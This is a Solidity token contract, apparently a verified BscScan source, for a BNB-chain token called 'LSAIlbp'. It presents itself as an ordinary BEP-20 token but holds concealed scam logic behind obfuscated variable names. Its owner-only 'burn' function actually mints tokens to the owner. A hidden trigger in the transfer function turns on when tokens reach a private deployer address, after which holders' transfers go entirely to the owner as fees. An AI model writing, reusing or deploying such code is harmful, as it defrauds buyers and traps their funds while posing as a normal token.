/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.9;
contract LSAIlbp {
uint256 private  ATREvQ = 10000000000000;
uint256 public constant IgCHIW = 9+1;
address public  eMSHtq = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  clKKJJ = 100000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  YnxpvR = 100000000000000000000000;
string public  name = "LSAIlbp";
uint8 public constant decimals = 18;
string public  symbol = "LSAIlbp";
uint256 public  mdgrrr = 10000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  QvrueP = 10000000000000000000;
uint256 public  YjgkAT = 100000000000000000;
address public  IUkxfT = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address private  JIwtJI = address(0);
address public  cJTcty = address(0);
address public  LgrTZB = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  PhCNEZ = 10000000000000000;
address public  tQsnqK = address(0);
uint256 public  FrgzHw = 100000000000000000000;
uint256 public  DDzaQh = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  nFAnEH = address(0);
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () public {
JIwtJI = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XuFnmu");
require(to != address(0), "XuFnmu");
require(amount <= balanceOf[from], "XuFnmu");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* IgCHIW/ATREvQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==JIwtJI){
ATREvQ = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
	  function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}